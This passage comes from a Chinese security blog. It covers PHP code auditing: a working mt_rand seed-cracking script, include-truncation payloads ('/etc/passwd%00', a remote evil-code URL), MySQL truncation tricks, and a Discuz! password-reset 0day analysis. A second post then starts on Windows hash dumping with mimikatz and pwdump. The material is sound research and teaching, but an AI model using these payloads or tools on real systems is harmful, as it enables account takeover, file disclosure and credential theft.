<td style="text-align:left">mt_rand-A-3</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:left">例B</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><em>seed-B</em></td>
</tr>
<tr>
<td style="text-align:left">mt_rand-B-1</td>
</tr>
<tr>
<td style="text-align:left">mt_rand-B-2</td>
</tr>
<tr>
<td style="text-align:left">mt_rand-B-3</td>
</tr>
</tbody>
</table>
<p>对于seed-A里mt_rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于seed-B，那么mt_rand-A-1就等于mt_rand-B-1…，这样我们只要能够得到seed就可以得到每次mt_rand的值了。</p>
<p>对于5.2.6&gt;php&gt;4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以为这样就是安全的），这个要分两种情况来分析：</p>
<p>第一种：’Cross Application Attacks’，这个思路在Stefan Esser文章里有提到，主要是利用其他程序定义的播种（如mt_srand ((double) microtime()<code>*</code> 1000000)），phpbb+wordpree组合就存在这样的危险.</p>
<p>第二种：5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，这是Stefan Esser的文章里的描述：<br>The Implementation</p>
<blockquote>
<p>When mt_rand() is seeded internally or by a call to mt_srand() PHP 4 and PHP 5 &lt;= 5.2.0 force the lowest bit to 1. Therefore the strength of the seed is only 31 and not 32 bits. In PHP 5.2.1 and above the implementation of the Mersenne Twister was changed and the forced bit removed.</p>
</blockquote>
<p>在32位系统上默认的播种的种子为最大值是<code>2^32</code>，这样我们循环最多<code>2^32</code>次就可以破解seed。而在PHP 4和PHP 5 &lt;= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录 [3] ）,测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">mt_srand(<span class="number">4</span>); </div><div class="line">$a = mt_rand(); </div><div class="line">mt_srand(<span class="number">5</span>); </div><div class="line">$b = mt_rand();</div><div class="line"><span class="keyword">print</span> $a.<span class="string">"\n"</span>.$b;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>通过上面的代码发现$a==$b，所以我们循环的次数为2^32/2=2^31次。我们看如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//base on http://www.milw0rm.com/exploits/6421 </span></div><div class="line"><span class="comment">//test on php 5.2.0</span></div><div class="line"></div><div class="line">define(<span class="string">'BUGGY'</span>, <span class="number">1</span>); <span class="comment">//上面代码$a==$b时候定义BUGGY=1</span></div><div class="line"></div><div class="line">$key = wp_generate_password(<span class="number">20</span>, <span class="keyword">false</span>);</div><div class="line"><span class="keyword">echo</span> $key.<span class="string">"\n"</span>;</div><div class="line">$seed = getseed($key);</div><div class="line"><span class="keyword">print</span> $seed.<span class="string">"\n"</span>; </div><div class="line"></div><div class="line">mt_srand($seed);</div><div class="line">$pass = wp_generate_password(<span class="number">20</span>, <span class="keyword">false</span>);</div><div class="line"><span class="keyword">echo</span> $pass.<span class="string">"\n"</span>;	</div><div class="line">	</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_generate_password</span><span class="params">($length = <span class="number">12</span>, $special_chars = true)</span> </span>&#123;</div><div class="line">	$chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</div><div class="line">	<span class="keyword">if</span> ( $special_chars )</div><div class="line">		$chars .= <span class="string">'!@#$%^&amp;*()'</span>;</div><div class="line"></div><div class="line">	$password = <span class="string">''</span>;</div><div class="line">	<span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</div><div class="line">		$password .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</div><div class="line">	<span class="keyword">return</span> $password;</div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getseed</span><span class="params">($resetkey)</span> </span>&#123;</div><div class="line">	$max = pow(<span class="number">2</span>,(<span class="number">32</span>-BUGGY));</div><div class="line">	<span class="keyword">for</span>($x=<span class="number">0</span>;$x&lt;=$max;$x++) &#123;</div><div class="line">		$seed = BUGGY ? ($x &lt;&lt; <span class="number">1</span>) + <span class="number">1</span> : $x; </div><div class="line">		mt_srand($seed);</div><div class="line">		$testkey = wp_generate_password(<span class="number">20</span>,<span class="keyword">false</span>);</div><div class="line">		<span class="keyword">if</span>($testkey==$resetkey) &#123; <span class="keyword">echo</span> <span class="string">"o\n"</span>; <span class="keyword">return</span> $seed; &#125;</div><div class="line"></div><div class="line">		<span class="keyword">if</span>(!($x % <span class="number">10000</span>)) <span class="keyword">echo</span> $x / <span class="number">10000</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>运行结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">php5&gt;php rand.php</div><div class="line">M8pzpjwCrvVt3oobAaOr</div><div class="line">0123456789101112131415161718192021222324252627282930313233343536373839404142434</div><div class="line">445464748495051525354555657585960616263646566676869</div><div class="line">7071727374757677787980818283848586878889909192939495969798991001011021031041051</div><div class="line">061071081091101111121131141151161171181191201211221</div><div class="line">2312412512612712812913013113213313413513613713813914014114214314414514614714814</div><div class="line">915015115215315415515615715815916016116216316416516</div><div class="line">6167168169170171172173174175176177178179180181182183184185186187188189190191192</div><div class="line">193194195196197198199200201202203204205206207208209</div><div class="line">2102112122132142152162172182192202212222232242252262272282292302312322332342352</div><div class="line">362372382392402412422432442452462472482492502512522</div><div class="line">..............01062110622106231062410625106261062710628106291063010631106321063</div><div class="line">3o</div><div class="line">70693</div><div class="line">pjwCrvVt3oobAaOr</div></pre></td></tr></table></figure>
<p>当10634次时候我们得到了结果。</p>
<p>当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">mt_srand(<span class="number">42</span>);</div><div class="line"><span class="keyword">echo</span> mt_rand();</div><div class="line"><span class="comment">//php&lt;=5.20 1387371436</span></div><div class="line"><span class="comment">//php&gt;5.20 1354439493 		</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>正是这个原因，也要求了我们的exp的运行环境：当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，反过来也是一样。</p>
<p>从上面的测试及分析来看，php&lt;5.26不管有没有定义播种，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等，这样的后果就是被攻击者恶意利用直接修改密码。</p>
<p>很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞）</p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：php4 php5&lt;5.2.6</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找mt_srand/mt_rand</td>
</tr>
</tbody>
</table>
<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><hr>
<p>其实“特殊字符”也没有特定的标准定义，主要是在一些code hacking发挥着特殊重作用的一类字符。下面就举几个例子：</p>
<h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>其中最有名的数大家都熟悉的null字符截断。</p>
<h4 id="include截断"><a href="#include截断" class="headerlink" title="include截断"></a>include截断</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">include</span> $_GET[<span class="string">'action'</span>].<span class="string">".php"</span>; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交“action=<code>http://www.hacksite.com/evil-code.txt</code>?”这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">////////////////////</span></div><div class="line"><span class="comment">////var5.php代码:</span></div><div class="line"><span class="comment">////include $_GET['action'].".php"; </span></div><div class="line"><span class="comment">////print strlen(realpath("./"))+strlen($_GET['action']);  </span></div><div class="line"><span class="comment">///////////////////</span></div><div class="line">ini_set(<span class="string">'max_execution_time'</span>, <span class="number">0</span>);</div><div class="line">$str=<span class="string">''</span>;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">50000</span>;$i++)</div><div class="line">&#123;</div><div class="line">	$str=$str.<span class="string">"/"</span>;</div><div class="line"></div><div class="line">	$resp=file_get_contents(<span class="string">'http://127.0.0.1/var/var5.php?action=1.txt'</span>.$str);</div><div class="line">	<span class="comment">//1.txt里的代码为print 'hi';</span></div><div class="line">	<span class="keyword">if</span> (strpos($resp, <span class="string">'hi'</span>) !== <span class="keyword">false</span>)&#123;</div><div class="line">		<span class="keyword">print</span> $i;</div><div class="line">		<span class="keyword">exit</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和<code>*</code>nix的系统长度不一样，当win下strlen(realpath(“./“))+strlen($<code>_</code>GET<code>[&#39;action&#39;]</code>)的长度大于256时被截断，对于<code>*</code>nix的长度是4 <code>*</code> 1024 = 4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]）</p>
<h4 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h4><p>对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数据。</p>
<p><em>1) Mysql SQL Column Truncation Vulnerabilities</em></p>
<p>这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：<br>​    </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">mysql&gt; insert into truncated_test(`username`,`password`) values("admin","pass");</div><div class="line"></div><div class="line">mysql&gt; insert into truncated_test(`username`,`password`) values("admin           x", "new_pass");</div><div class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from truncated_test;</div><div class="line">+----+------------+----------+</div><div class="line">| id | username   | password |</div><div class="line">+----+------------+----------+</div><div class="line">| 1 | admin      | pass     |</div><div class="line">| 2 | admin      | new_pass |</div><div class="line">+----+------------+----------+</div><div class="line">2 rows in set (0.00 sec)</div></pre></td></tr></table></figure>
<p><em>2) Mysql charset Truncation vulnerability</em></p>
<p>这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：<br>​    </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; insert into truncated_test(`username`,`password`) values(concat("admin",0xc1), "new_pass2");</div><div class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from truncated_test;</div><div class="line">+----+------------+----------+</div><div class="line">| id | username   | password |</div><div class="line">+----+------------+----------+</div><div class="line">| 1 | admin      | pass      |</div><div class="line">| 2 | admin      | new_pass  |</div><div class="line">| 3 | admin      | new_pass2 |</div><div class="line">+----+------------+----------+</div><div class="line">2 rows in set (0.00 sec)</div></pre></td></tr></table></figure>
<p>很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$result = mysql_query(<span class="string">"SELECT * from test_user where user='$user' "</span>);</div><div class="line">  ....</div><div class="line"><span class="keyword">if</span>(@mysql_fetch_array($result, MYSQL_NUM)) &#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"already exist"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：通读代码</td>
</tr>
</tbody>
</table>
<h4 id="文件操作里的特殊字符"><a href="#文件操作里的特殊字符" class="headerlink" title="文件操作里的特殊字符"></a>文件操作里的特殊字符</h4><p>文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“...\”进行系统转跳等等。<br>​<br>下面还给大家介绍一个非常有意思的问题：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Is this code vul?</span></div><div class="line"><span class="keyword">if</span>( eregi(<span class="string">".php"</span>,$url) )&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"ERR"</span>);</div><div class="line">&#125;</div><div class="line">$fileurl=str_replace($webdb[www_url],<span class="string">""</span>,$url);</div><div class="line">.....</div><div class="line">header(<span class="string">'Content-Disposition: attachment; filename='</span>.$filename);</div></pre></td></tr></table></figure>
<p>很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str_replace替换$webdb[www_url]为空，那么我们提交“.p$webdb[www_url]hp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$fileurl=str_replace($webdb[www_url],<span class="string">""</span>,$url);</div><div class="line"><span class="keyword">if</span>( eregi(<span class="string">".php"</span>,$url) )&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"ERR"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">255</span>;$i++) &#123;</div><div class="line">	$url = <span class="string">'1.ph'</span>.chr($i);</div><div class="line">	$tmp = @file_get_contents($url);</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($i).<span class="string">"\r\n"</span>;</div><div class="line">&#125;  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>我们在windows系统运行上面的代码得到如下字符<code>*</code> &lt; &gt; ? P p都可以打开目录下的1.php。</p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：文读取件操作函数</td>
</tr>
</tbody>
</table>
<h3 id="怎么进一步寻找新的字典"><a href="#怎么进一步寻找新的字典" class="headerlink" title="怎么进一步寻找新的字典"></a>怎么进一步寻找新的字典</h3><p>上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一步找到新的字典或者利用方式呢？</p>
<ul>
<li>分析和学习别人发现的漏洞或者exp，总结出漏洞类型及字典</li>
<li>通过学习php手册或者官方文档,挖掘出新的有危害的函数或者利用方式</li>
<li>fuzz php的函数，找到新的有问题的函数（不一定非要溢出的），如上一章的4.6的部分很多都可以简单的fuzz脚本可以测试出来</li>
<li>分析php源代码，发现新的漏洞函数“特性”或者漏洞。（在上一节里介绍的那些“漏洞审计策略”里，都没有php源代码的分析，如果你要进一步找到新的字典，可以在php源代码的基础上分析下成因，然后根据这个成因来分析寻找新的漏洞函数“特性”或者漏洞。）（我们以后会陆续公布一些我们对php源代码的分析）</li>
<li>有条件或者机会和开发者学习，找到他们实现某些常用功能的代码的缺陷或者容易忽视的问题</li>
<li>你有什么要补充的吗？ ：）</li>
</ul>
<h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><table>
<thead>
<tr>
<th style="text-align:left"><em>DEMO</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">*DEMO – Discuz! Reset User Password 0day Vulnerability 分析</td>
</tr>
<tr>
<td style="text-align:left">（Exp:[<a href="http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]）*" target="_blank" rel="external">http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]）*</a></td>
</tr>
<tr>
<td style="text-align:left">PHP版本要求:php4 php5&lt;5.2.6</td>
</tr>
<tr>
<td style="text-align:left">系统要求: 无</td>
</tr>
<tr>
<td style="text-align:left">审计策略:查找mt_srand/mt_rand</td>
</tr>
</tbody>
</table>
<p>第一步 安装Discuz! 6.1后利用grep查找mt_srand得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">heige@heige-desktop:~/dz6/upload$ grep -in &apos;mt_srand&apos; -r ./ --colour -5</div><div class="line">./include/global.func.php-694-  $GLOBALS[&apos;rewritecompatible&apos;] &amp;&amp; $name = rawurlencode($name);</div><div class="line">./include/global.func.php-695-  return &apos;&lt;a href=&quot;tag-&apos;.$name.&apos;.html&quot;&apos;.stripslashes($extra).&apos;&gt;&apos;;</div><div class="line">./include/global.func.php-696-&#125;</div><div class="line">./include/global.func.php-697-</div><div class="line">./include/global.func.php-698-function random($length, $numeric = 0) &#123;</div><div class="line">./include/global.func.php:699:  PHP_VERSION &lt; &apos;4.2.0&apos; &amp;&amp; mt_srand((double)microtime() * 1000000);</div><div class="line">./include/global.func.php-700-  if($numeric) &#123;</div><div class="line">./include/global.func.php-701-          $hash = sprintf(&apos;%0&apos;.$length.&apos;d&apos;, mt_rand(0, pow(10, $length) - 1));</div><div class="line">./include/global.func.php-702-  &#125; else &#123;</div><div class="line">./include/global.func.php-703-          $hash = &apos;&apos;;</div><div class="line">./include/global.func.php-704-          $chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&apos;;</div><div class="line">--</div><div class="line">./include/discuzcode.func.php-30-</div><div class="line">./include/discuzcode.func.php-31-if(!isset($_DCACHE[&apos;bbcodes&apos;]) | !is_array($_DCACHE[&apos;bbcodes&apos;]) | !is_array($_DCACHE[&apos;smilies&apos;])) &#123;</div><div class="line">./include/discuzcode.func.php-32-       @include DISCUZ_ROOT.&apos;./forumdata/cache/cache_bbcodes.php&apos;;</div><div class="line">./include/discuzcode.func.php-33-&#125;</div><div class="line">./include/discuzcode.func.php-34-</div><div class="line">./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);</div><div class="line">./include/discuzcode.func.php-36-</div><div class="line">./include/discuzcode.func.php-37-function attachtag($pid, $aid, &amp;$postlist) &#123;</div><div class="line">./include/discuzcode.func.php-38-       global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;</div><div class="line">./include/discuzcode.func.php-39-       $attach = $postlist[$pid][&apos;attachments&apos;][$aid];</div><div class="line">./include/discuzcode.func.php-40-       if($attach[&apos;attachimg&apos;]) &#123;</div></pre></td></tr></table></figure>
<p>有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PHP_VERSION &lt; &apos;4.2.0&apos; &amp;&amp; mt_srand((double)microtime() * 1000000);</div></pre></td></tr></table></figure>
<p>判断了版本，如果是PHP_VERSION &gt; ‘4.2.0’使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况：</p>
<p>1) ‘Cross Application Attacks’ 这个思路是只要目标上有使用使用的程序里定义了类似mt_srand((double)microtime() <code>*</code> 1000000)的播种的话，又很有可能被暴力。在dz这里不需要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);</div></pre></td></tr></table></figure>
<p>这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]）</p>
<p>2) 有的人认为如果没有mt_srand((double)microtime() <code>*</code> 1000000);这里的定义，那么dz就不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不利用’Cross Application Attacks’，5.2.6&gt;php&gt;4.2.0 php本身默认播种的算法也不是很强悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。</p>
<h3 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h3><p>本文是80vul的三大马甲：80vul-A，80vul-B，80vul-C集体智慧的结晶，尤其是80vul-B贡献了不少新发现。</p>
<p>另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就没有本文。</p>
<p>本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！</p>
<h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>[1] (<a href="http://bbs.phpchina.com/attachment.php?aid=22294" target="_blank" rel="external">http://bbs.phpchina.com/attachment.php?aid=22294</a>)<br>[2] ([<a href="http://www.php-security.org/" target="_blank" rel="external">http://www.php-security.org/</a>)<br>[3] (<a href="http://bugs.php.net/bug.php?id=40114" target="_blank" rel="external">http://bugs.php.net/bug.php?id=40114</a>)</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/10/28/密码破解系列/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/10/28/密码破解系列/" itemprop="url">
                  密码破解系列
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-28T19:44:04+08:00">
                2017-10-28
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/10/28/密码破解系列/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/10/28/密码破解系列/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/10/28/密码破解系列/" class="leancloud_visitors" data-flag-title="密码破解系列">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文总结了有关Windows密码、Linux密码、网络设备密码、数据库密码、无线网络密码、web应用登陆密码的破解以及在线扫描服务的密码破解。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>####1.windows密码破解</p>
<p>获取密码（抓取HASH）：pwdump、wce、mimikatz</p>
<p>破解密码：hashcat、LC5、SAMInside.exe、Ophcrack、mimikatz、hashsuite</p>
<p>密码抓取：</p>
<p>环境：windows7</p>
<p>前提：已经获取root权限</p>
<p>工具：mimikatz</p>
<p>操作：</p>
<p>原理是从lsass.exe进程中直接获取密码信息进行破解，而且该破解应该并非穷举方式，而是直接根据算法进行反向计算。</p>
<p><img src="http://ok44mzy2k.bkt.clouddn.com/9BDC799D-7107-4E3A-86CB-E65207AB9637.png" alt="9BDC799D-7107-4E3A-86CB-E65207AB9637"></p>
<p>密码提取：</p>
<p>原因：为了进行口令破解，必须首先运行一个工具，将Windows口令从SAM文件中提取出来，做这一步工作的原因在于Windows运行过程中SAM被锁定，不能直接复制或编辑这个文件(即使有管理员权限也不行)。</p>
<p>环境：windows10（提取hash）、Windows7（破解hash）</p>
<p>工具：Pwdump7，wce（Windows Credentials Editor）</p>
<p>操作：</p>
<p>用管理员权限打开Pwdump7，从而获得Windows口令</p>
